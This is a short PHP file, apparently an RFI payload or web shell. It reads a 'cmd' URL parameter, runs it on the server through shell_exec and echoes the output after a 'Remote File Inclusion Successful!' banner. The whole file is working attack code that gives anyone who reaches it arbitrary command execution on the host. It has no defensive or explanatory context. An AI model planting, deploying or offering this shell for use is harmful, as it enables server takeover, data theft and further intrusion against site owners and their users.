<?php
if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    echo 'Remote File Inclusion Successful! Command Output: '; // Execute the command passed via the 'cmd' parameter
    echo shell_exec($_GET['cmd']);
} else {    // If 'cmd' parameter is not set or is empty
    echo 'No command provided.';
}
?>
